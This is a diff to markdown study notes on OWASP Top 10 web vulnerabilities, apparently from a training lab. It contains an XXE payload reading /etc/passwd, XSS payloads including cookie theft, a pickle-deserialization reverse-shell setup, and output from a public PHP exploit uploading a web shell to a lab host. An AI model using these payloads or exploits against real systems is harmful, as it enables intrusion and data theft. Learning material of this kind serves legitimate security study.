@@ -74,7 +74,7 @@ There are two-types of XXE attacks: in-band & out-of-band (OOB-XXE)
 Note: "#PCDATA" means parsable character data.
 
 
-Below is an XML document that uses.
+- Below is an XML document that uses.
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE note SYSTEM "note.dtd">
@@ -102,10 +102,8 @@ Below is an XML document that uses.
 
 ```
 
-As we can see we are defining a ENTITY called `name` & assiging it a value called `feast`.
-Later we are using ENTITY in our code.
-
-We can also use XXE to read some sensitive file by defining an ENTITY & having it use the SYSTEM keyword.
+- As we can see we are defining a ENTITY called `name` & assiging it a value called `feast`. Later we are using ENTITY in our code.
+- We can also use XXE to read some sensitive file by defining an ENTITY & having it use the SYSTEM keyword.
 
 ```
 <?xml version="1.0"?>
@@ -113,8 +111,113 @@ We can also use XXE to read some sensitive file by defining an ENTITY & having i
 <root>&read;</root>
 
 ```
-we are defining an ENTITY with the name `read` but the difference is we are setting it to value `SYSTEM` & path of the file.
+- We are defining an ENTITY with the name `read` but the difference is we are setting it to value `SYSTEM` & path of the file.
+- If we use this payload, then a website vulnerable to XXE would display the contents of the file `/etc/passwd`
+- In a similar manner, you can read other files.
 
-If we use this payload, then a website vulnerable to XXE would display the contents of the file `/etc/passwd`
 
-In a similar manner, you can read other files 
+## Broken Access Control
+
+- To put simply, broken access control allows attackers to bypass authorization which can allow them to view sensitive data or perform tasks as if they were a privileged user.
+
+### IDOR - Insecure Direct Object Reference
+- Its an act of exploiting the mis-configuration in the way user input is handled, to access resources you wouldn't normally able to access.
+- try changing url parameters & you will find access to the information.
+
+## Security Mis-Configuration
+
+- Security misconfigurations include
+  - poorly configured permissions on cloud services like s3 buckets.
+  - having unnecessary features enabled, like services, pages, accounts or privileges
+  - default accounts with unchanged passwords
+  - error messages that are overly detailed & allow an attacker to find out more about the system.
+  - Not using "HTTP Security Headers", or revealing too much detail in the server: HTTP header.
+- This vulnerability can often lead to more vulnerabilities, such as default credentials giving you access to sensitive data, XXE or command injection on admin pages.
+- Whatever the app is, search for the default credentials that are there, surf the internet & that is all it takes
+
+## Cross-Site Scripting (XSS)
+- A web application is vulnerable to XSS if it uses unsanitized user input. XSS is possible in javascript, VBscript, Flash & CSS. There are 3 main types of cross-site scripting.
+
+### Stored XSS
+- The most dangerous type of XSS. This is where a malicious string originates from the website's database. This often happens when a website allows user input that is not sanitized when inserted into the database.
+### Reflected XSS
+- The malicious payload is part of victims request to the website. The website includes this payload in response back to the server. To summarize, the attacker needs to trick the victim to click the url to execute their malicious payload.
+### DOM-Based XSS
+- DOM stands for Document Object Model & is a programming interface for HTML & XML documents. It represents the page so that the programs can change the document structure, style and content. 
+
+
+### XSS Payloads
+- `<script>alert("Hello World")</script>`
+- `<script>alert(window.location.hostname)</script>`
+- `<script>alert(document.cookie)</script>`
+- `<img src=x onerror=alert('XSS');>`
+- `<script>document.getByElementId("thm-title").innerHTML="I am a hacker"</script>`
+- [XSS Keylogger](http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html)
+- [XSS PortScanning](http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html)
+
+
+## Insecure Deserialization
+- This definition is still quite the board to say the least.
+- Simply, insecure deserialization is replacing data processed by an application with malicious code allowing anything from DoS (Denial of Service) to RCE(Remote Code Execution) that the attacker can use to gain a foothold in a pentesting scenario.
+- Specifically this code leverages the legitimate serialization & de-serialization process used by web applications.
+- At summary, ultimately, any application that stores or fetches data where there are no validations or integrity checks in place for the data retained or queried.
+  - E-commerce websites
+  - Forums
+  - API's
+  - Application Runtimes (Tomcat, Jenkins, JBoss)
+
+### Code Execution
+- Usually an application trusts whatever is encoded as trustworthy
+```
+cookie={"payload": payload}
+pickle_payload=pickle.dumps(cookie)
+encodedPayloadCookie=base64.b64encode(pickle_payload)
+resp=make_response(redirect("/myprofile"))
+resp.set_cookie("encodedPayload",encodedPayloadCookie)
+
+
+>>> import pickle
+>>> cookie={"payload":"sample payload"}
+>>> pickle_payload=pickle.dumps(cookie)
+>>> pickle_payload
+b'\x80\x04\x95\x1f\x00\x00\x00\x00\x00\x00\x00}\x94\x8c\x07payload\x94\x8c\x0esample payload\x94s.'
+>>> encoded_payload=base64.b64encode(pickle_payload)
+>>> encoded_payload
+b'gASVHwAAAAAAAAB9lIwHcGF5bG9hZJSMDnNhbXBsZSBwYXlsb2FklHMu'
+>>> 
+```
+- Usually cookies (encodedPayloadCookie) is stored on your browser
+- Once you visit a particular form this cookie is decoded & de-serialized with a code something like this.
+```
+cookie=request.cookie.get("encodedPayload")
+pickle.loads(base64.b64decode(cookie))
+```
+- Now using a vulnerability in pickle you can encode a reverse shell code & set the cookie
+- this will help you get the reverse shell on the target machine
+- take a look at [RCE.py](./rce.py)
+
+
+## Components with Known Vulnerabilities
+- If the vuln is already well known, it may open may doors for an attacker to penetrate the app & obtain a RCE
+- So, even if the company misses a single update, they could be vulnerable to any number of attacks.
+- Hence OWASP has rated this a number 3 - as a company can easily miss an update to their application.
+- All you need to do is find the exploit & run it against the target to obtain a reverse shell
+
+You exploit PHP vulnerability
+https://www.exploit-db.com/exploits/47887
+
+```
+python3 exploit.py http://10.10.88.112
+> Attempting to upload PHP web shell...
+> Verifying shell upload...
+> Web shell uploaded to http://10.10.88.112/bootstrap/img/F6Zn61GQJX.php
+> Example command usage: http://10.10.88.112/bootstrap/img/F6Zn61GQJX.php?cmd=whoami
+> Do you wish to launch a shell here? (y/n): y
+RCE $ whoami
+www-data
+
+RCE $ wc -c /etc/passwd
+1611 /etc/passwd
+
+RCE $ 
+```
